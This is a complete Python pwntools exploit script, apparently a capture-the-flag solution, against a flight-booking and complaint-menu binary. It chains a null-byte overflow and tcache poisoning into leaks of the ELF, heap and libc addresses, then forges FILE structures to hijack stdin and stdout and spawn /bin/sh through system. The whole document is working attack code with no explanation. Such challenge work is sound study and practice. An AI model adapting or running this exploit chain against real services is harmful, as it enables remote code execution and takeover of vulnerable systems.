#!/usr/bin/env python3

from dataclasses import dataclass, field
from pwn import *

host = args.HOST or 'localhost'
port = int(args.PORT or 2727)
ssl = args.SSL or False


binary = 'cac_patched'

gdbscript = '''

    c
'''

context.binary = elf = ELF(binary)
context.terminal = ['tmux', 'splitw', '-h']

if os.path.isfile("./libc.so.6"): libc = ELF('./libc.so.6', checksec=False)


# utils
u64 = lambda d: struct.unpack("<Q", d.ljust(8, b"\0"))[0]
u32 = lambda d: struct.unpack("<I", d.ljust(4, b"\0"))[0]
u16 = lambda d: struct.unpack("<H", d.ljust(2, b"\0"))[0]

# credits to spwn by @chino
ru         = lambda *x, **y: p.recvuntil(*x, **y, drop=True, timeout=1)
rl         = lambda *x, **y: p.recvline(*x, **y, keepends=False)
rc         = lambda *x, **y: p.recv(*x, **y)
sla        = lambda *x, **y: p.sendlineafter(*x, **y, timeout=1)
sa         = lambda *x, **y: p.sendafter(*x, **y)
sl         = lambda *x, **y: p.sendline(*x, **y)
sn         = lambda *x, **y: p.send(*x, **y)
logbase    = lambda: log.info("libc base = %#x" % libc.address)
logleak    = lambda name, val: log.info(name+" = %#x" % val)
one_gadget = lambda: [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '--raw', '-l1', libc.path]).decode().split(' ')]

# exit_handler stuff
fs_decrypt = lambda addr, key: ror(addr, 0x11) ^ key
fs_encrypt = lambda addr, key: rol(addr ^ key, 0x11)


# heap stuff
prot_ptr = lambda pos, ptr: (pos >> 12) ^ ptr
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port, ssl=ssl)
    else:
        return process([elf.path] + argv, *a, **kw)




def add_booking(reference, flight, name=None):
    sla(b'> ', b'1')
    sla(b'> ', reference) 
    sla(b'> ', flight)
    if name:    
        sla(b'> ', name)     

def check_in(reference):
    sla(b'> ', b'2')
    sla(b'> ', reference)

def booking_info(reference):
    sla(b'> ', b'3')
    sla(b'> ', reference)
    if b"not found" in rl():
        return None
    ru("Reference: ")
    ref = rl()
    ru("Name: ")
    name = rl()
    ru("Flight: ")
    flight = rl()
    return ref, name, flight

def customer_complaint(reference, complaint):
    sla(b'> ', b'4')
    sla(b'> ', reference)
    sla(b'> ', complaint)
    ru("complaint ID: ")
    return int(ru("."))

def edit_complaint(complaint_id, new_complaint):
    sla(b'> ', b'5')
    sla(b'>', str(complaint_id).encode())
    sla(b'> ', new_complaint)

def book_flight(name):
    sla(b'> ', b'6')
    sla(b'> ', name)
    ru("Reference: ")
    return rl()

def exit_():
    sla(b'> ', b'8')


def null_byte(c_id, offset, byte=b"\x21"):
    edit_complaint(str(c_id), byte*(offset - len(f" - Complaint ID: {c_id}\0")))

@dataclass
class Exploit:
    p: tube
    libc : ELF = field(default_factory=lambda: libc)
    elf : ELF = field(default_factory=lambda: context.binary)

    heap_base : int = 0

    def log_state(self) -> None:
        logleak("ELF base", self.elf.address)
        logleak("heap base", self.heap_base)
        logleak("libc base", self.libc.address)


    def run(self):
        while True:
            try:
                self.leak_elf()
                self.leak_heap()
                self.leak_libc()
                self.log_state()
                self.overwrite_stdin()
                self.overwrite_stdout_shell()
                break
            except Exception as e:
                log.failure(f"[attempt failed] {e!s}")
                self.p.close()
                self.p = start()
                global p
                p = self.p
                self.__dict__.update(Exploit(self.p).__dict__)


    def leak_elf(self):
        # get ELF base
        self.elf.address = 0
        ru("free pointer: ")
        self.elf.address = int(rl(), 16) - self.elf.sym['book_flight']
    
    def leak_heap(self):
        # set up heap for exploitation
        self.ref = book_flight(b'NOOB')
        self.cc_dummy_id1 = customer_complaint(self.ref, b'cc_dummy_id1')
        self.cc_dummy_id2 = customer_complaint(self.ref, b'cc_dummy_id2')
        self.cc_id1 = customer_complaint(self.ref, b'cc_id1')
        self.cc_id2 = customer_complaint(self.ref, b'cc_id2')
        book_flight(b'NOOB2')
        self.b_id = book_flight(b'NOOB3')
        
        # overwrite nullbyte so it points to heap address and leak
        null_byte(self.cc_id2, 424, b"C")
        self.heap_base = u64(booking_info(self.b_id)[2]) - 0x870

    def leak_libc(self):
        self.libc.address = 0
        # set up heap
        cc_id3 = customer_complaint(self.ref, b"cc_id3")
        cc_id4 = customer_complaint(self.ref, b"cc_id4")
        add_booking(b"A"*8, b"A"*8)
        target = self.heap_base+0xb00
        pnt = prot_ptr(target, self.heap_base + 0xae0)
        
        # check if the alignment is correct
        if pnt & 0xf:
            raise RuntimeError("pnt misaligned (leak_libc) - restarting")
        new_pnt = pnt & 0xffffffffffffff00
        new_pos_rel_id4 = prot_ptr(target, new_pnt)

        # check if the chunk will be allocated in the complaint chunk
        if new_pos_rel_id4 & 0xfff > 0xa90:
            raise RuntimeError("chunk placement wrong (leak_libc) - restarting")
        
        target_write = self.heap_base + 0x810
        self.cc_dummy_id1_addr = self.heap_base + 0x338
        self.cc_dummy_id2_addr = self.heap_base + 0x448

        self.cc_id3_addr = self.heap_base + 0x898
        self.cc_id4_addr = self.heap_base + 0x9a8

        # set up the metadata for tcache so it doesnt get angry when freeing
        null_byte(cc_id4, 344)
        offset = (new_pos_rel_id4 - 8) - self.cc_id3_addr + 1

        for i in range(7):
            null_byte(cc_id3, offset+i)

        add_booking(b"A"*8, b"CA128")

        # gotta set up the tcache pointer to point to the new chunk that then points to GOT
        pad = new_pos_rel_id4 - self.cc_id4_addr
        dummy_new_pos = self.cc_dummy_id2_addr + pad
        edit_complaint(cc_id4, b"A"*pad + p64(prot_ptr(new_pos_rel_id4, dummy_new_pos)))

        null_byte(cc_id3, (new_pos_rel_id4+7)-self.cc_id3_addr)
        null_byte(cc_id3, (new_pos_rel_id4+6)-self.cc_id3_addr)

        edit_complaint(self.cc_dummy_id2, b"A"*pad + p64(prot_ptr(dummy_new_pos, target_write)))

        null_byte(self.cc_dummy_id1, (dummy_new_pos+7)-self.cc_dummy_id1_addr)
        null_byte(self.cc_dummy_id1, (dummy_new_pos+6)-self.cc_dummy_id1_addr)

        add_booking(b"A"*8, b"CC123", p64(self.elf.got['puts']))

        libc.address = u64(booking_info(self.b_id)[2]) - self.libc.sym.puts

        if libc.address & 0xfff != 0:
            raise RuntimeError("libc address misaligned (leak_libc) - restarting")

    def overwrite_stdin(self):
        # set up heap for new overwrite
        cc_id5 = customer_complaint(self.ref, b'SHIT')
        cc_id6 = customer_complaint(self.ref, b'SHIT')

        add_booking(b"A"*8, b"A"*8)


        target = self.heap_base+0xdd0
        pnt = prot_ptr(target, self.heap_base + 0xdb0)
        if pnt & 0xf:
            raise RuntimeError("pnt misaligned (overwrite_stdin) - restarting")
        
        new_pnt = pnt & 0xffffffffffffff00
        new_pos_rel_id6 = prot_ptr(target, new_pnt)
        # again, make sure the new chunk is malloced into the complaint
        if new_pos_rel_id6 & 0xfff > 0xd40:
            raise RuntimeError("chunk placement wrong (overwrite_stdin) - restarting")

        wide_data = libc.address + 2111456
        lock = libc.address + 2119440
        stdin_fake = FileStructure(0)
        stdin_fake.flags = 0x3b01010101010101
        stdin_fake._IO_read_base = 0
        stdin_fake._IO_read_ptr = 0
        stdin_fake._IO_buf_base = libc.sym._IO_2_1_stdout_ 
        stdin_fake._IO_buf_end = libc.sym._IO_2_1_stdout_ + 0x200
        stdin_fake.fileno = 0
        stdin_fake._codecvt = self.heap_base + 0x2a0
        stdin_fake._wide_data = wide_data
        stdin_fake._lock= lock
        stdin_fake.unknown2=p64(0)*2+p64(libc.sym['_IO_2_1_stdin_']+0x20)+p64(0)*3+p64(libc.sym['_IO_file_jumps'])


        # write the fake filestruct in the complaint chunk
        edit_complaint(self.cc_dummy_id2, bytes(stdin_fake).replace(b"\x00", b"\x21"))
        null_locs = [i for i, j in enumerate(bytes(stdin_fake)) if j == 0]
        for i in null_locs:
            null_byte(self.cc_dummy_id1, (self.cc_dummy_id2_addr-self.cc_dummy_id1_addr)+i)


        overwrite_target = elf.address + 20528 # stdin pointer in the binary
        payload = p64(self.cc_dummy_id2_addr) # address of the fake struct


        cc_id5_addr = self.heap_base + 0xb48
        cc_id6_addr = self.heap_base + 0xc58

        # overwrite the stdin pointer in bss to point to the fake struct
        null_byte(cc_id6, 376)
        offset = (new_pos_rel_id6 - 8) - cc_id5_addr + 1
        for i in range(7):
            null_byte(cc_id5, offset+i)

        pad = new_pos_rel_id6 - cc_id6_addr

        edit_complaint(cc_id6, b"\x21"*pad + p64(prot_ptr(new_pos_rel_id6, overwrite_target)))
        for i in range(7):
            null_byte(cc_id5, offset+i)
       
        null_byte(cc_id5, (new_pos_rel_id6+7)-cc_id5_addr)
        null_byte(cc_id5, (new_pos_rel_id6+6)-cc_id5_addr)

        add_booking(b"A"*8, b"CC123", payload)

    def overwrite_stdout_shell(self):
        lock = libc.address + 2119440
        stdout_lock = lock
        stdout = libc.sym._IO_2_1_stdout_
        fake_vtable = libc.sym._IO_wfile_jumps - 0x18
        gadget = libc.address + 0x00000000001724f0

        fake_stdout = FileStructure(0)
        fake_stdout.flags = 0x3b01010101010101
        fake_stdout._IO_read_end = libc.sym.system  
        fake_stdout._IO_save_base = gadget
        fake_stdout._IO_write_end = u64(b'/bin/sh')  
        fake_stdout._lock = stdout_lock
        fake_stdout._codecvt = stdout + 0xb8
        fake_stdout._wide_data = stdout + 0x200   
        fake_stdout.unknown2 = p64(0)*2 + p64(stdout + 0x20) + p64(0)*3 + p64(fake_vtable)

        # call check_in since it calls puts after the fread and send in the fake stdout struct
        check_in(bytes(fake_stdout))

p = start()
exploit = Exploit(p)
exploit.run()
p.interactive()

